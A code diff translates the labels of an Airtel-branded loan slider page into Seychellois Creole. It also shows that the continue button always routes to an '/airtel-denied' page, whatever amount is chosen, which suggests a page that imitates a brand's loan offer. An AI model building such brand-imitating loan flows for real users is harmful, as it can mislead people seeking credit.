@@ -6,7 +6,7 @@ function AirtelLoanLimit() {
   // State for the slider
   const [loanAmount, setLoanAmount] = useState(25000);
   const termMonths = 12;
-  const processingFee = 100; // Added Processing Fee
+  const processingFee = 100;
 
   const handleSliderChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setLoanAmount(Number(e.target.value));
@@ -261,15 +261,18 @@ function AirtelLoanLimit() {
               <line x1="19" y1="12" x2="5" y2="12" />
               <polyline points="12 19 5 12 12 5" />
             </svg>
-            Back
+            {/* CHANGED: Translated to Seychellois Creole */}
+            Retounen
           </button>
 
-          <h1 className="title">Your Loan Limit</h1>
-          <p className="subtitle">Drag the slider to choose your amount</p>
+          {/* CHANGED: Translated to Seychellois Creole */}
+          <h1 className="title">Ou Limit Pre</h1>
+          <p className="subtitle">Gliise pou swazir ou montan</p>
 
           {/* AMOUNT BOX WITH SLIDER */}
           <div className="amount-box">
-            <span className="amount-label">Available Loan Amount</span>
+            {/* CHANGED: Translated to Seychellois Creole */}
+            <span className="amount-label">Montan Pre Disponib</span>
             
             <div className="amount-display">
               <span className="amount-value">{loanAmount.toLocaleString('en-US')}</span>
@@ -295,21 +298,25 @@ function AirtelLoanLimit() {
 
           {/* DETAILS (DYNAMIC) */}
           <div className="detail-row">
-            <span className="detail-label">Loan Term</span>
-            <span className="detail-value">{termMonths} months</span>
+            {/* CHANGED: Translated to Seychellois Creole */}
+            <span className="detail-label">Dire Pre</span>
+            <span className="detail-value">{termMonths} mwa</span>
           </div>
           <div className="detail-row">
-            <span className="detail-label">Interest Rate</span>
+            {/* CHANGED: Translated to Seychellois Creole */}
+            <span className="detail-label">To Entere</span>
             <span className="detail-value" style={{ color: '#DA1C1C' }}>
               {currentInterestRate}%
             </span>
           </div>
           <div className="detail-row">
-            <span className="detail-label">Processing Fee</span>
+            {/* CHANGED: Translated to Seychellois Creole */}
+            <span className="detail-label">Fre Dossier</span>
             <span className="detail-value">{processingFee} SR</span>
           </div>
           <div className="detail-row">
-            <span className="detail-label">Monthly Repayment</span>
+            {/* CHANGED: Translated to Seychellois Creole */}
+            <span className="detail-label">Peman sak Mwa</span>
             <span className="detail-value">{monthlyRepayment.toLocaleString('en-US')} SR</span>
           </div>
 
@@ -317,12 +324,12 @@ function AirtelLoanLimit() {
           <button 
             className="continue-btn" 
             onClick={() => {
-              // Save the selected amount so the next page can use it
               localStorage.setItem('airtelLoanAmount', loanAmount.toString());
               navigate('/airtel-denied');
             }}
           >
-            Continue to Get Loan
+            {/* CHANGED: Translated to Seychellois Creole */}
+            Kontinie pou Ganny Pre
             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
               <line x1="5" y1="12" x2="19" y2="12" />
               <polyline points="12 5 19 12 12 19" />
